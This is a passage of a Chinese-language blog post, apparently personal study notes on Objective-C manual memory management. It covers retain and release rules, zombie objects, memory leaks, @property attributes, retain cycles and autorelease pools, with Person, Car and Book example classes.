class="line">    Person* p1=[[Person alloc]init];</span><br><span class="line">    p1.name=<span class="string">@&quot;zx&quot;</span>;</span><br><span class="line">    <span class="built_in">NSUInteger</span> count=[p1 retainCount];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;count=%lu&quot;</span>,count);</span><br><span class="line">    [p1 release];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>内存管理的重点</p><p>  1). 什么时候为对象发送retain消息.</p><pre><code>  当多1个人使用这个对象的时候,应该先为这个对象发送retain消息.</code></pre><p>  2). 什么时候为对象发送releaee消息.</p><pre><code>  当少1个人使用这个对象的时候.应该为这个对象发送1条release消息.</code></pre></li><li><p>在ARC机制下,retain release dealloc这些方法方法无法调用.</p></li><li><p>内存管理的原则<br>1). 有对象的创建,就要匹配1个release</p><p>2). retain的次数和release的次数要匹配.</p><p>3). 谁用谁retain. 谁不用谁release.</p><pre><code>谁负责retain 谁就负责relase</code></pre><p>4). 只有在多1个人用的时候才retain 少1个人使用的时候才release</p></li></ol><pre><code> 有始有终,有加就有减. 有retain就应该匹配1个release 一定要平衡.</code></pre><h3 id="野指针和僵尸对象"><a href="#野指针和僵尸对象" class="headerlink" title="野指针和僵尸对象"></a>野指针和僵尸对象</h3><ol><li><p>野指针</p><p>C语言中的野指针: 定义1个指针变量.没有初始化.这个指针变量的值是1个垃圾值,指向1块随机的空间.这个指针就叫做野指针.</p><p>OC中的野指针: 指针指向的对象已经被回收了.这样的指针就叫做野指针.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person* p1=[Person new];</span><br><span class="line">[p1 release]</span><br><span class="line">//此时p1为野指针</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li>对象回收的本质.内存回收的本质: 申请1个变量,实际上就是向系统申请指定字节数的空间.这些空间系统就不会再分配给别人了.<br>当变量被回收的时候,代表变量占用的字节空间从此以后系统可以分配给别人使用了.<br>但是字节空间中存储的数据还在.</li></ol><p>​         回收对象:<br>         所谓的对象的回收,指的是对象占用的空间可以分配给别人.<br>         当这个对象占用的空间没有分配给别人之前 其实对象数据还在.</p><ol start="3"><li><p>僵尸对象<br>1个已经被释放的对象,但是这个对象所占的空间还没有分配给别人.这样的对象叫做僵尸对象.</p><p>我们通过野指针去访问僵尸对象的时候.有可能没问题 也有可能有问题.</p><p>当僵尸对象占用的空间还没有分配给别人的时候.这是可以的.<br>当僵尸对象占用的空间分配给了别人使用的时候 就不可以.</p></li></ol><ol start="4"><li><p>我们认为只要对象称为了僵尸对象,无论如何 都不允许访问了.<br>就希望如果访问的是僵尸对象,无论如何报错.</p><p>僵尸对象的实时检查机制.可以将这个机制打开. 打开之后. 只要访问的是僵尸对象,无论空间是否分配 就会报错.</p></li></ol><ol start="5"><li><p>为什么不默认打开僵尸对象检测.</p><p>一旦打开僵尸对象检测 那么在每访问1个对象的时候 都会先检查这个对象是否为1个僵尸对象,<br>这样是极其消耗性能的.</p></li><li><p>使用野指针访问僵尸对象会报错. 如何避免僵尸对象错误..</p><p>当1个指针称为野指针以后.将这个指针的值设置nil</p><p>当1个指针的值为nil 通过这个指针去调用对象的方法(包括使用点语法)的时候.不会报错. 只是没有任何反应.</p><pre><code>             但是如果通过直接访问属性 -&gt; 就会报错.</code></pre></li><li><p>无法复活1个僵尸对象.</p></li></ol><p>​         僵尸对象到底能不能用，不能报错</p><h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><ol><li>内存泄露.指的是1个对象没有被及时的回收.在该回收的时候而没有被回收<br>一直驻留在内存中,直到程序结束的时候才回收.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main&#123;</span><br><span class="line">Person* p1=[Person new];</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>单个对象的内存泄露的情况.</p><p>1). 有对象的创建,而没有对应的relase</p><p>2). retain的次数和relase的次数不匹配.</p><p>3). 在不适当的时候,为指针赋值为nil</p><p>4). 在方法中为传入的对象进行不适当的retain</p></li></ol><ol start="3"><li><p>如何保证单个对象可以被回收</p><p>1). 有对象的创建 就必须要匹配1个relase</p><p>2). retain次数和release次数一定要匹配.</p><p>3). 只有在指针称为野指针的时候才赋值为nil</p><p>4). 在方法中布要随意的为传入的对象retain.</p></li><li><p>当属性是1个OC对象的时候. setter方法的写法.</p></li></ol><p>将传进来的对象赋值给当前对象的属性,代表传入的对象多了1个人使用,所以我们应该先为这个传入的对象发送1条retain消息 再赋值.</p><p>当当前对象销毁的时候.代表属性指向的对象少1个人使用. 就应该在dealloc中relase</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">//Person.m</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line"></span><br><span class="line">@implementation Person</span><br><span class="line"></span><br><span class="line">- (void)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    //当人对象挂的时候,代表当前这个人对象就不会再使用_car指向的对象了.</span><br><span class="line">    //我们说,当不再使用1个对象的时候 应该为这个对象发送1条releaexiaoxi</span><br><span class="line">    [_car release];</span><br><span class="line">    NSLog(@&quot;人挂了.&quot;);</span><br><span class="line">    [super dealloc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)setCar:(Car *)car</span><br><span class="line">&#123;</span><br><span class="line">    //将传入的车对象赋值给当前对象的_car属性.</span><br><span class="line">    //代表: 传入的对象多了1个人使用.</span><br><span class="line">    //那么就应该先为这个对象发送1条retain消息</span><br><span class="line">    //[car retain];//为传进来的对象发送1条retain消息,代表多1个人使用.</span><br><span class="line">    //_car = [car retain];</span><br><span class="line">    </span><br><span class="line">  if(_car!=car)&#123;   //如果新旧对象bu是一个</span><br><span class="line">    [_car release];</span><br><span class="line">    _car = [car retain];</span><br><span class="line">    //为传进来的对象发送1条retain消息,让他的引用计数器的值+1 代表多1个人使用.</span><br><span class="line">    //再将传入的对象赋值给当前对象的_car属性.</span><br><span class="line">  &#125;  </span><br><span class="line">   </span><br><span class="line">        </span><br><span class="line">    //当我们将传入的Car对象赋值给_car属性的时候.</span><br><span class="line">    //代表1: _car属性原本指向的对象少1个人使用.</span><br><span class="line">    //代表2: 传入的对象多1个使用.</span><br><span class="line">    //所以,我们应该先将_car属性原本指向的对象release 再将传入的新对象retain</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">- (Car *)car</span><br><span class="line">&#123;</span><br><span class="line">    return _car;</span><br><span class="line">&#125;</span><br><span class="line">- (void)drive</span><br><span class="line">&#123;</span><br><span class="line">    NSLog(@&quot;走,去拉萨,开车&quot;);</span><br><span class="line">    [_car run];</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Car.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Car.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Car</span></span></span><br><span class="line">- (<span class="keyword">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;时速为%d的车子报废了.&quot;</span>,_speed);</span><br><span class="line">    [<span class="keyword">super</span> dealloc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="keyword">void</span>)setSpeed:(<span class="keyword">int</span>)speed</span><br><span class="line">&#123;</span><br><span class="line">    _speed = speed;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">int</span>)speed</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> _speed;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">void</span>)run</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;时速为%d的车子在行驶.&quot;</span>,_speed);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  用面向对象模拟1个案例:</span><br><span class="line">   </span><br><span class="line">  凤姐开车去拉萨.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  人类:</span><br><span class="line">    属性: 车.</span><br><span class="line">    行为: 开车.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  车类:</span><br><span class="line">    属性: 速度.</span><br><span class="line">    行为: 行驶.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  1. 当属性是1个OC对象的时候. setter方法的写法.</span><br><span class="line"> </span><br><span class="line">     将传进来的对象赋值给当前对象的属性,代表传入的对象多了1个人使用,所以我们应该先为这个传入的对象发送1条retain消息 再赋值.</span><br><span class="line"> </span><br><span class="line">     当当前对象销毁的时候.代表属性指向的对象少1个人使用. 就应该在dealloc中relase</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     代码写法:</span><br><span class="line"> </span><br><span class="line">     - (void)setCar:(Car *)car</span><br><span class="line">     &#123;</span><br><span class="line">        _car = [car retain];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     - (void)dealloc</span><br><span class="line">     &#123;</span><br><span class="line">        [_car release];</span><br><span class="line">        [super dealloc];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  2. 当属性是1个OC对象的时候,setter方法照着上面那样写,其实还是有Bug的.</span><br><span class="line">     当为对象的这个属性多次赋值的时候.就会发生内存泄露.</span><br><span class="line">     发生泄露的原因: 当为属性赋值的时候, 代表旧对象少1个人用.新对象多1个人使用.</span><br><span class="line">     应该relase旧的 retain新的.</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     - (void)setCar:(Car *)car</span><br><span class="line">     &#123;</span><br><span class="line">         [_car release];</span><br><span class="line">         _car = [car retain];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  3.</span><br><span class="line"> </span><br><span class="line"> */</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    Person *p1 = [[Person alloc] init];</span><br><span class="line">    Car *bmw = [Car new];</span><br><span class="line">    bmw.speed = 100;</span><br><span class="line">    </span><br><span class="line">    p1.car = bmw;</span><br><span class="line">    [p1 drive];</span><br><span class="line"></span><br><span class="line">    [bmw release]; </span><br><span class="line">    bmw.speed = 200;</span><br><span class="line">    p1.car = bmw;</span><br><span class="line"></span><br><span class="line">    [p1 release];</span><br><span class="line">     */</span><br><span class="line">    </span><br><span class="line">    /*</span><br><span class="line">    Person *p1 = [Person new];</span><br><span class="line">    </span><br><span class="line">    Car *bmw = [Car new];</span><br><span class="line">    bmw.speed = 200;</span><br><span class="line">    p1.car = bmw;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Car *benz = [Car new];</span><br><span class="line">    benz.speed = 400;</span><br><span class="line">    p1.car = benz;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    [benz release];</span><br><span class="line">    [bmw release];</span><br><span class="line">    [p1 release];</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    Person *fj = [Person new];//1</span><br><span class="line">    </span><br><span class="line">    Car *bmw = [Car new];//1</span><br><span class="line">    bmw.speed = 100;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    fj.car = bmw;//bmw  2</span><br><span class="line">    </span><br><span class="line">    [fj drive];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    [bmw release];//bmw 1</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    [fj drive];//?能不能开车?</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    [fj release];//0</span><br><span class="line">     */</span><br><span class="line">    return 0;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204231505868.png" alt="image-20220423150537635"></p><p>如果对象属性不是oc对象不用这样写</p><p>@property如果采用类属性为直接赋值，不对，采用property参数</p><h3 id="property参数"><a href="#property参数" class="headerlink" title="property参数"></a>property参数</h3><p>@property 参数分为4类</p><p>//@property 参数分为4类<br>/*<br>1.与set方法内存管理相关参数<br>retain: 要生成符合内存管理原则的set方法(应用与对象类型     OC对象)，注意只是setter生成，dealloc要自己写<br>assign: 直接赋值,(对象类型,基本数据类型    非OC对象)<br>copy : (后面讲解)<br>*/</p><p>//2.多线程相关<br>//nonatomic: 不生成多线程线管代码,使用这个就可以了(效率高一点)<br>//atomic:生成多线程线管代码(不写默认是这种方式)，加线程安全锁<br>//实际开发中,只要是对象类型的@property都写成下面</p><p>//3.是否要生成set与get方法<br>//readwrite: 可读可写属性,同时生成set与get方法<br>//readonly : 只读属性,只生成get方法</p><p>//4.set与get方法名称相关的参数，标准的名字<br>//setter:设置生成的set方法名称（加冒号）<br>//getter:设置生成的get方法名称</p><p>@property (nonatomic,retain) Car * car;<br>@property (nonatomic,retain)NSString * name;<br>@property (nonatomic,assign)int age; //int float double char<br>@property (nonatomic,assign)int weight;<br>@property (nonatomic,assign,readonly)int idCard;<br>@property (nonatomic,assign,setter = abc:,getter = zhuanghuimei)int height;<br>//改变set与get方法名称很多都是用在BOOL类型的变量<br>@property (nonatomic,assign,setter = isDeid:,getter = isDeid)BOOL isDeid;</p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204231752001.png" alt="image-20220423175233963"></p><p>getter=getter方法名字用来指定@property生成的getter.方法的名字，<br>setter=setter方法名字，用来指定@property生成的setter.方法的名字，注意，setter方法是带参数的所以要加I个冒号，<br>记住：如果使用getter setter修改了生成的方法的名字，<br>在使用点语法的时候，编译器会转换为调用修改后的名字的代码。<br>修改生成的getter setter方法名字，因为默认情况下生成的方法的名字已经是最标准的名字了，<br>所以，一般情况下不要去改，<br>1),无论什么情况都不要改setter.方法的名字，因为默认情况下生成的名字就已经是最标准的了，<br>2),什么时候修改getter方法的名字，当属性的类型是1个B00L类型的时候，就修改这个getter的名字以1s开头提高代码的阅读性，</p><p>总结<br>1.与多线程相关的参数：用nonatomic<br>2.与生成的setter方法实现相关的参数<br>        属性的类型是0C对象的时候使用retain<br>        属性的类型是非0C对象的时候使用assign<br>3.只读读写，<br>        如果你希望生成的封装是只读封装那么就使用readonly<br>        如果希望读写封装readwrite<br>4.</p><p>​        1)无论什么情况都不要改setter方法的名字，因为默认情况下生成的名字就已经是最标准的了，<br>​        2)什么时候修改getter方法的名字，当属性的类型是1个B00L类型的时候，就修改这个getter的名字以is开头提高代码的阅读性。</p><h3 id="class"><a href="#class" class="headerlink" title="@class"></a>@class</h3><p>1.当两个类相互包含的时候，当Person.h中包含Book,h而Book.h中又包含Person.h<br>    这个时候，就会出现循环引用的问题，就会造成无限递归的问题，而导致无法编译通过，<br>2.解决方案：<br>    其中一边不要使用#mport引入对方的头文件，<br>    而是使用@class类名；来标注这是1个类。这样子就可以在不引入对方头文件的情况下，告诉编译器这    是1个类。<br>3.@class与#import的区别<br>    1).#imp0rt是将指定的文件的内容拷贝到写指令的地方。<br>    2).class并不会拷贝任何内容，只是告诉编译器，这是1个类，这样编译器在编译的时候才可以知道这是1个类。</p><h3 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h3><p>两个类均包含另一个类的属性，赋值后，两边使用retain，最后release会造成内存泄露</p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241129835.png" alt="image-20220424112940285" style="zoom:50%;" /><p>解决方案：</p><p>一端使用retain，一端使用assign，使用assign那段dealloc中不在需要release</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//Person.h</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Book.h&quot;</span><br><span class="line">@interface Person : NSObject</span><br><span class="line">@property(nonatomic,retain)NSString *name;</span><br><span class="line">@property(nonatomic,assign)Book *book;</span><br><span class="line">- (void)read;</span><br><span class="line">@end</span><br><span class="line">    </span><br><span class="line">//Person.m</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">@implementation Person</span><br><span class="line">- (void)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    NSLog(@&quot;人死了&quot;);</span><br><span class="line">    [_name release];</span><br><span class="line">    //[_book release];</span><br><span class="line">    [super dealloc];</span><br><span class="line">&#125;</span><br><span class="line">- (void)read</span><br><span class="line">&#123;</span><br><span class="line">    [_book castZhiShi];</span><br><span class="line">    NSLog(@&quot;啊,书真好&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Book.h</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@class</span> <span class="title">Person</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Book</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">retain</span>)<span class="built_in">NSString</span> *name;</span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">retain</span>)Person *owner;</span><br><span class="line"><span class="comment">//传智播客 传播知识 播撒智慧 的一帮侠客们.</span></span><br><span class="line">- (<span class="keyword">void</span>)castZhiShi;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//Book.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Book.h&quot;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Book</span></span></span><br><span class="line">- (<span class="keyword">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    [_name release];</span><br><span class="line">    [_owner release];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;书被烧了&quot;</span>);</span><br><span class="line">    [<span class="keyword">super</span> dealloc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="keyword">void</span>)castZhiShi</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;书中自有黄金屋,书中自有颜如玉!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241230914.png" alt="image-20220424123029903"></p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241245487.png" alt="image-20220424124541232"></p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241246512.png" alt="image-20220424124610403"></p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241253797.png"></p><p><img src="/C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20220424125413694.png" alt="image-20220424125413694"></p><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204241256589.png" alt="image-20220424125646654"></p><h3 id="自动释放池-MRC常用"><a href="#自动释放池-MRC常用" class="headerlink" title="自动释放池(MRC常用)"></a>自动释放池(MRC常用)</h3><p><strong>1.自动释放池的原理.</strong></p><p>存入到自动释放池中的对象,在自动释放池被销毁的时候.会自动调用存储在该自动释放池中的所有对象的release方法.</p><p><strong>可以解决的问题:</strong></p><p>将创建的对象,存入到自动释放池之中. 就不再需要手动的relase这个对象了.</p><p>因为池子销毁的时候 就会自动的调用池中所有的对象的release。</p><p><strong>自动释放池的好处</strong>: </p><p>将创建的对象存储到自动释放池中,不需要再写release</p><p><strong>2.如何创建自动释放池.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@autoreleasepool</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这对大括弧代表这个自动释放池的范围.</p><p><strong>3.如何将对象存储到自动释放池之中</strong></p><p>在自动释放池之中调用对象的autorelease方法.就会将这个对象存入到当前自动释放池之中.</p><p>这个autorealse方法返回的是对象本身. 所以,我们可以这么写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@autoreleasepool</span><br><span class="line">&#123;</span><br><span class="line">   Person *p1 = [[[Person alloc] init] autorelease];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候,当这个自动释放池执行完毕之后,就会立即为这个自动释放池中的对象发送1条release消息.</p><p>目前为止,我们感受到得autorelase的好处:<br>创建对象,调用对象的autorelease方法 将这个对象存入到当前的自动释放池之中.</p><p>我们就不需要再去release 因为自动释放池销毁的时候 就会自动的调用池中所有对象的release</p><p><strong>3.使用注意</strong></p><p>​    1). 只有在自动释放池中调用了对象的autorelease方法,这个对象才会被存储到这个自动释放池之中.<br>​    如果只是将对象的创建代码写在自动释放之中,而没有调用对象的autorelease方法.是不会将这个对象存储到这个自动释放池之中的.</p><p>​    2). 对象的创建可以在自动释放池的外面,在自动释放池之中,调用对象的autorelease方法,就可以将这个对象存储到这个自动释放池之中.</p><p>​    3). 当自动释放池结束的时候.仅仅是对存储在自动释放池中的对象发送1条release消息 而不是销毁对象.</p><p>​    4). 如果在自动释放池中,调用同1个对象的autorelease方法多次.就会将对象存储多次到自动释放池之中.<br>​    在自动释放池结束的时候.会为对象发送多条release消息.那么这个是就会出现僵尸对象错误.<br>​    所以,1个自动释放池之中,只autorelease1次,只将这个对象放1次, 否则就会出现野指针错误.</p><p>​    5). 如果在自动释放池中,调用了存储到自动释放中的对象的release方法.<br>​    在自动释放池结束的时候,还会再调用对象的release方法.<br>​    这个时候就有有可能会造成野指针操作.<br>​    </p><p>也可以调用存储在自动释放池中的对象的retain方法.</p><p> 6). 将对象存储到自动释放池,并不会使对象的引用计数器+1<br>     所以其好处就是:创建对象将对象存储在自动释放池,就不需要在写个release了.</p><p> 7).  自动释放池可以嵌套.<br>      调用对象的autorelease方法,会讲对象加入到当前自动释放池之中<br>      只有在当前自动释放池结束的时候才会像对象发送release消息.</p><p><strong>4.autorelease的规范.</strong><br>    0). 创建对象,将对象存储到自动释放池之中. 就不需要再去手动的realse。</p><pre><code> 1). 类方法的第1个规范:  一般情况下,要求提供与自定义构造方法相同功能的类方法.这样可以快速的创建1个对象  2). 我们一般情况下,写1个类. 会为我们的类写1个同名的类方法,用来让外界调用类方法来快速的得到1个对象.  规范:使用类方法创建的对象,要求这个对象在方法中就已经被autorelease过了.  这样,我们只要在自动释放池中, 调用类方法来创建对象, 那么创建的对象就会被自动的加入到自动释放中.  提供1个类方法来快速的得到1个对象.  **规范**  a. 这个类方法以类名开头. 如果没有参数就直接是类名 如果有参数就是 类名WithXX:  b. 使用类方法得到的对象,要求这个对象就已经被autorelease过了.</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(instancetype)person</span><br><span class="line"></span><br><span class="line">return [[[self alloc] init] 